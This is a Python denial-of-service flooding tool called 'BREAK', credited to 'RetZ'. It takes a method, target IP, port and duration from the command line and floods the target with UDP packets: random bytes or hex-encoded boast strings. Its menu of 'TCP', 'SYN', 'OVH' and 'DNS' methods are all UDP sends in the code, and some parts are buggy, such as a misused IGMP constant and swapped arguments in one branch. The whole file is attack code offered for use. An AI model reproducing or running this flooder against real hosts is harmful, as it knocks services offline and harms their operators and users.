import sys, os, socket, time, threading, random

def uransend(ip, times, port, dmg):

  timeout = time.time() + float(times)
  sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  while time.time() < timeout:
    sock.sendto(dmg, (ip, int(port)))
    s.sendto(dmg, (ip, int(port)))

def paysend(ip, times, port, payload):

  timeout = time.time() + float(times)
  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

  while time.time() < timeout:
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))
    sock.sendto(payload, (ip, int(port)))

os.system("clear")
def main():
  try:
    method = str(sys.argv[1])
    ip = str(sys.argv[2])
    port = int(sys.argv[3])
    times = int(sys.argv[4])

    banner = f"""
\t\033[1;31;40m[ ================================================== ]
\t[ # ]                                            [ # ]
\t[ # ]\033[1;34;40m  ██████╗░██████╗░███████╗░█████╗░██╗░░██╗\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║░██╔╝\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██████╦╝██████╔╝█████╗░░███████║█████═╝░\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██╔══██╗██╔══██╗██╔══╝░░██╔══██║██╔═██╗░\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ██████╦╝██║░░██║███████╗██║░░██║██║░╚██╗\033[1;31;40m  [ # ]
\t[ # ]\033[1;34;40m  ╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝\033[1;31;40m  [ # ]
\t[ # ]                                            [ # ]
\t[ ================================================== ]
\n\n\t\t[ × ]=====\033[1;32;40m Code By RetZ\033[1;31;40m =====[ × ]
\t\t[ × ] \033[1;33;40mCreated At 30 Sep 2022 \033[1;31;40m[ × ]
\t\t[ × ]========================[ × ]\n\n
\t\t[ $ ]\033[1;32;40m METHOD      : {method}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m IP TARGET   : {ip}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m PORT TARGET : {port}\033[1;31;40m
\t\t[ $ ]\033[1;32;40m TIMES       : {times}\033[0m
"""

    if method == "UDP":
      try:
        socket.gethostbyname(ip)
        pack = 615
        dmg = random._urandom(int(pack))
        threading.Thread(target=uransend, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "UDPV2":
      try:
        socket.gethostbyname(ip)
        pack = 65500
        dmg = random._urandom(int(pack))
        threading.Thread(target=uransend, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "UDPV3":
      try:
        socket.gethostbyname(ip)
        payload = b'5544502041545441434b204259205245545a203e3e20c397c39720494e4a454354494f4e2055445020c397c397203c3c204259504153532055445020464c4f4f44205252455820434f4d4d554e495459'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCP":
      try:
        socket.gethostbyname(ip)
        pack = 1460
        dmg = random._urandom(int(pack))
        threading.Thread(target=uransend, args=(ip, times, port, dmg)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCPV2":
      try:
        socket.gethostbyname(ip)
        payload = b'54435020425950415353204d4554484f44204259205245545a203e3e20c397444f574e20444f574ec3973e3e2052455820434f4d4d554e495459'
        threading.Thread(target=paysend, args=(ip, port, times, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "TCPV3":
      try:
        socket.gethostbyname(ip)
        payload = b'42595041535320544350204d4554484f4453203d3d3e205245545a203c3d3d2041545441434b494e4720494e4a454354494f4e204252555445464f524345'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVH":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b204f564820534153203e3e2044454c4159203e3e20464c4f4f44204259205245545a203c3c20494e4a454354494f4e204f56482053415320c397c397c39720444f574e'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV2":
      try:
        socket.gethostbyname(ip)
        payload = b'4f5648204e41542041545441434b2046524f4d205245545a203e205245582052494f5420434f4d4d554e495459'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV3":
      try:
        socket.gethostbyname(ip)
        payload = b'5245545a2041545441434b204f564820534153203e205245582052494f5420434f4d4d554e49545920494e4a454354'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "OVHV4":
      try:
        socket.gethostbyname(ip)
        payload = b'5245545a2041545441434b204f56482053415320494e4a4543542057495448205245582052494f5420434f4d4d554e495459'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYN":
      try:
        socket.gethostbyname(ip)
        payload = b'5245545a204c555454205441414e4f532041545441434b2053594e204d4554484f44203e3e3e205245582052494f5420434f4d4d554e495459203e3e3e2036313520383131203635353030'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV2":
      try:
        socket.gethostbyname(ip)
        payload = b'494e4a454354494f4e2053594e204259205245545a203e3e205245582052494f5420434f4d4d554e495459203c3c20494e4a454354494f4e2053594e204259205245545a'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNS":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b494e4720444e53204259205245545a20c3973d20464c4f4f44494e47203dc39720494e4a45435420c3973d2044454c4159203dc39720444f574e20c3973d2052455820434f4d4d554e495459'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOOD":
      try:
        socket.gethostbyname(ip)
        payload = b'464c4f4f442041545441434b20c3973d20464c4f4f44494e4720c3973d20494e4a45435420c3973d20464c4f4f44204259205245545a2052455820434f4d4d554e49545920464c4f4f44'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOODV2":
      try:
        socket.gethostbyname(ip)
        payload = b'464c4f4f44494e4720563220494e4a454354204259205245545a2e'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "FLOODV3":
      try:
        socket.gethostbyname(ip)
        payload = b'464c4f4f44494e4720563220494e4a454354204259205245545a2e'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV3":
      try:
        socket.gethostbyname(ip)
        payload = b'53594e20464c4f4f442041545441434b204259205245545a204142434844495349454a46'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "SYNV4":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b2053594e2056203420464c4f4f44494e47204259205245545a20464f534f574b524a43'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNSV2":
      try:
        socket.gethostbyname(ip)
        payload = b'41545441434b494e4720444e53205632204259205245545a20464c4f4f44494e4720494e4a454354494f4e205245582052494f54'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass
    elif method == "DNSV3":
      try:
        socket.gethostbyname(ip)
        payload = b'494e4a454354494f4e2041545441434b20444e53205633204259205245545a20464c4f4f44494e4720414a53495849444a444b53'
        threading.Thread(target=paysend, args=(ip, times, port, payload)).start()
        print(banner)
        time.sleep(times)
        os.system("clear")
      except ValueError:
        pass
      except socket.gaierror:
        pass

  except:
    print("""\n\n\n
\t\t\t    ╔╗ ╦═╗╔═╗╔═╗╦╔═
\t\t\t    ╠╩╗╠╦╝║╣ ╠═╣╠╩╗
\t\t\t    ╚═╝╩╚═╚═╝╩ ╩╩ ╩
\t ╔═════════════════════════════════════════════════════╗
\t ║          UDP           ║ ║           OVH            ║
\t ║         UDPV2          ║ ║          OVHV2           ║
\t ║         UDPV3          ║ ║          OVHV3           ║
\t ║          TCP           ║ ║          OVHV4           ║
\t ║         TCPV2          ║ ║           DNS            ║
\t ║         TCPV3          ║ ║          DNSV2           ║
\t ║         FLOOD          ║ ║          DNSV3           ║
\t ║        FLOODV2         ║ ║           SYN            ║
\t ║        FLOODV3         ║ ║          SYNV2           ║
\t ║        [COMING         ║ ║          SYNV3           ║
\t ║          SOON]         ║ ║          SYNV4           ║
\t╔╩════════════════════════╝ ╚══════════════════════════╩╗
\t║         USAGE : [METHOD] [IP] [PORT] [TIME]           ║
\t╚═══════════════════════════════════════════════════════╝
\n\n""")

global times

if __name__ == '__main__':
  main()
